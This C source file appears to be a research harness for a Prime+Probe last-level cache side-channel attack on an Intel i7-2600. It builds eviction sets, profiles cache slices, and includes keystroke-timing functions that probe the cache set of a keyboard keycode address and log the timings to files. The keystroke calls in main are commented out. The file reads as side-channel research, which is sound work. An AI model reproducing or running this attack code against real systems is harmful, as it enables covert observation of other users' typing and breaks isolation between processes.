#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include <x86intrin.h>

#include "../lib/constants.h"
#include "../lib/eviction.h"
#include "../lib/l3pp.h"
#include "../lib/utils.h"

#define TRIALS 1000

void *mapping_start;
EvictionSet **es_list;
unsigned int core_id = 0;
FILE *file;

void cleanup(EvictionSet **es_listl, void *mapping_start, FILE *file) {
  fclose(file);
  free_es_list(es_list);
  munmap(mapping_start, EVERGLADES_LLC_SIZE << 4);
}
void handle_sigint(int sig) {
  safe_print("SIGINT received, cleanup process initiated\n");
  cleanup(es_list, mapping_start, file);
  exit(1);
}

void test_eviction_set(void) {
  uint8_t victim = 0x37;
  CacheLineSet *cl_set = new_cl_set();

  uint64_t threshold = threshold_from_flush(&victim);
  if (!get_minimal_set(&victim, &cl_set, threshold)) {
    printf("Error. Failed to generate minimal eviction set.\n");
  }

  // Bring the victim into the cache
  uint8_t var2 = victim ^ 0xF7;

  // Access eviction set
  NumList *timings = new_num_list(TRIALS);
  evict_and_time(cl_set, &victim, timings, true);

  // Report median and mean times
  printf("Timings after accessing eviction set:\n");
  print_stats(timings);

  int evictions = 0;

  for (int i = 0; i < TRIALS; i++) {
    if (timings->nums[i] > threshold) {
      evictions++;
    }
  }

  printf("Successfully evicted %u/%u trials.\n", evictions, TRIALS);

  deep_free_cl_set(cl_set);
  free_num_list(timings);
}

void test_eviction_and_pp(void) {
  uint8_t *target = malloc(sizeof(uint8_t *));
  printf("target: %p\n", target);
  uintptr_t pa = pointer_to_pa(target);

  // map 64 2 MB pages to ge 256 candidate lines
  mapping_start = mmap(NULL, EVERGLADES_LLC_SIZE << 4, PROT_READ,
                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
  if (mapping_start == MAP_FAILED) {
    perror("map");
    return;
  }

  printf("memory mapped: %p\n", mapping_start);

  int threshold = threshold_from_flush(target);

  CacheLineSet *cl_set;
  if (!get_minimal_set(target, &cl_set, threshold)) {
    printf("unable to obtain eviction set\n");
  }

  for (int i = 0; i < cl_set->size; i++) {
    printf("%p\n", cl_set->cache_lines[i]);
  }

  EvictionSet *es = new_eviction_set(cl_set);
  uint64_t time = evict_and_time_once(es, target);
  printf("threshold: %d, evict_time: %ld\n", threshold, time);

  sleep(1);

  access_set(es);
  volatile uint8_t tmp = *target;
  int list[16];
  probe(es, threshold);

  sleep(1);
  access_set(es);
  probe(es, threshold);

  free(target);
  deep_free_es(es);
  munmap(mapping_start, EVERGLADES_LLC_SIZE << 4);
}

void init_mapping() {
  mapping_start = mmap(NULL, EVERGLADES_LLC_SIZE << 4, PROT_READ,
                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
  if (mapping_start == MAP_FAILED) {
    perror("map");
    return;
  }
}

void test_find_all_eviction_sets(int set) {
  printf("set: %d\n", set);

  es_list = get_all_slices_eviction_sets(mapping_start, set);

  for (int i = 0; i < 4; i++) {
    printf("Eviction Set %d: \n", i);
    print_eviction_set(es_list[i]->cache_lines);
  }
}

int get_evset_index(int slice) {
  int ret = -1;
  for (int i = 0; i < 4; i++) {
    CacheLine *iter = es_list[i]->head;
    if (slice == get_i7_2600_slice(pointer_to_pa((void *)iter))) {
      ret = i;
    }
  }
  return ret;
}

uint64_t *profile_slices(int set) {
  test_find_all_eviction_sets(set);

  sleep(5);
  int slice_hit_count[4];
  uint8_t hit_times[1024 * 1024];
  uint64_t timestamps[64 * 64];
  char filename[20];

  uint64_t *size = malloc(4 * sizeof(uint64_t));
  int threshold = threshold_from_flush((void *)es_list[0]->head);
  uint64_t start_time = __rdtscp(&core_id);
  flush_timestamps(&start_time, sizeof(uint64_t), filename);
  for (int i = 0; i < 4; i++) {
    int slice = get_i7_2600_slice(pointer_to_pa((void *)es_list[i]->head));
    printf("testing slice index: %d\n", slice);
    size[slice] = prime_probe(es_list[i], EVERGLADES_ASSOCIATIVITY, hit_times,
                              1024 * 1024, timestamps, threshold);
    print_probe_result(hit_times, 1024 * 1024, 64, 64);
    sprintf(filename, "output%d.bin", slice);
    flush_timestamps(timestamps, size[slice], filename);
  }

  return size;
}

uint64_t measure_keystroke(int threshold) {
  int set = pa_to_set(KBD_KEYCODE_ADDR, EVERGLADES);
  int slice = get_i7_2600_slice(KBD_KEYCODE_ADDR);
  int eslist_index = get_evset_index(slice);
  uint8_t probemap[1024 * 1024];
  uint64_t keystrokes[64 * 64];

  uint64_t num_keystrokes = 0;
  uint64_t start_time = __rdtscp(&core_id);
  flush_timestamps(&start_time, 1, "pp_keystrokes.bin");
  printf("please start typing\n");
  for (int i = 0; i < 10; i++) {
    // takes around 1s to fill up 1 MB buffer
    uint64_t size = prime_probe(es_list[eslist_index], EVERGLADES_ASSOCIATIVITY,
                                probemap, 1024 * 1024, keystrokes, threshold);
    flush_timestamps(keystrokes, size, "pp_keystrokes.bin");
    num_keystrokes += size;
  }
  printf("\nnum_keystrokes: %lu\n", num_keystrokes);
  return start_time;
}

void measure_keystroke_without_slice(int threshold) {
  int set = pa_to_set(KBD_KEYCODE_ADDR, EVERGLADES);
  uint8_t probemap[4][1024 * 1024];
  uint64_t keystrokes[4][64 * 64];
  uint64_t total_strokes[4];

  char filename[20];
  uint64_t start_time = __rdtscp(&core_id);
  for (int i = 0; i < 4; i++) {
    total_strokes[i] = 0;
    sprintf(filename, "pp_keystrokes_%d.bin", i);
    flush_timestamps(&start_time, 1, filename);
  }

  printf("please start typing\n");
  for (int i = 0; i < 3; i++) {
    uint64_t *num_strokes = prime_probe_many_sets(
        es_list, EVERGLADES_NUM_SLICES, EVERGLADES_ASSOCIATIVITY, 1024 * 1024,
        probemap, 64 * 64, keystrokes, threshold);
    for (int j = 0; j < 4; j++) {
      sprintf(filename, "pp_keystrokes_%d.bin", j);
      flush_timestamps(keystrokes[j], num_strokes[j], filename);
      total_strokes[j] += num_strokes[j];
    }
    free(num_strokes);
  }
  for (int i = 0; i < 4; i++) {
    printf("%lu\n", total_strokes[i]);
  }
}

int main() {
  init_mapping();
  printf("set: %d, slice: %d\n", pa_to_set(KBD_KEYCODE_ADDR, EVERGLADES),
         get_i7_2600_slice(KBD_KEYCODE_ADDR));
  // es_list = get_all_slices_eviction_sets(mapping_start, 428);
  // measure_keystroke(threshold_from_flush(mapping_start));
  // free_es_list(es_list);
  munmap(mapping_start, EVERGLADES_LLC_SIZE << 4);
  return 0;
}
